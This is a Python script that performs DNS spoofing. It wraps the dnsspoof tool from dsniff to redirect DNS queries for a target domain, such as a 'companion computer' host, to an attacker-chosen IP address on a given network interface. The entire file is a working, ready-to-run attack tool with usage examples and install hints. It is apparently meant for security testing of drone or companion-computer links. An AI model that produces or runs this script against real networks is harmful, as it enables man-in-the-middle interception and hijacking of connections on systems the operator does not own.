#!/usr/bin/env python3
"""
DNS Spoofing Script
Performs DNS spoofing to redirect companion computer connections
"""

import sys
import subprocess
import time
import signal
import os

def dns_spoof(target_domain, spoofed_ip, interface):
    """
    Perform DNS spoofing using dnsspoof
    
    Args:
        target_domain: Domain to spoof (e.g., 'companion-computer.local')
        spoofed_ip: IP to redirect to
        interface: Network interface
    """
    print(f"[*] Starting DNS spoofing...")
    print(f"[*] Target domain: {target_domain}")
    print(f"[*] Spoofed IP: {spoofed_ip}")
    print(f"[*] Interface: {interface}")
    
    # Check if dnsspoof is available
    try:
        subprocess.run(['which', 'dnsspoof'], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        print("[-] dnsspoof not found. Install with: sudo apt-get install dsniff")
        return False
    
    # Check if running as root
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo)")
        return False
    
    # Create hosts file for dnsspoof
    hosts_file = '/tmp/dnsspoof_hosts'
    with open(hosts_file, 'w') as f:
        f.write(f"{spoofed_ip} {target_domain}\n")
        f.write(f"{spoofed_ip} *.{target_domain}\n")
    
    print(f"[*] Created hosts file: {hosts_file}")
    print("[+] Starting DNS spoofing (Press Ctrl+C to stop)...")
    
    try:
        process = subprocess.Popen(
            ['dnsspoof', '-i', interface, '-f', hosts_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        print("[+] DNS spoofing active")
        print("[!] DNS queries for target domain will be redirected")
        
        try:
            process.wait()
        except KeyboardInterrupt:
            print("\n[*] Stopping DNS spoofing...")
            process.terminate()
            process.wait()
    
    finally:
        # Cleanup
        if os.path.exists(hosts_file):
            os.remove(hosts_file)
        
        print("[+] DNS spoofing stopped")
    
    return True

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 dns_spoofing.py <target_domain> <spoofed_ip> <interface>")
        print("Example: python3 dns_spoofing.py companion.local 192.168.1.100 wlan0")
        print("\nThis script performs DNS spoofing to redirect domain name resolution.")
        print("Requires: dnsspoof (from dsniff package)")
        print("Install: sudo apt-get install dsniff")
        print("\nWARNING: This attack intercepts DNS queries!")
        sys.exit(1)
    
    target_domain = sys.argv[1]
    
    # Validate domain (basic check)
    if not target_domain or len(target_domain) > 255:
        print(f"[-] Invalid domain: {target_domain}")
        sys.exit(1)
    
    spoofed_ip = sys.argv[2]
    
    # Validate IP address (basic format check)
    import re
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if not ip_pattern.match(spoofed_ip):
        print(f"[-] Invalid spoofed IP format: {spoofed_ip}")
        sys.exit(1)
    
    interface = sys.argv[3]
    
    # Validate interface
    if not interface or len(interface) > 20:
        print(f"[-] Invalid interface: {interface}")
        sys.exit(1)
    
    dns_spoof(target_domain, spoofed_ip, interface)

if __name__ == "__main__":
    main()
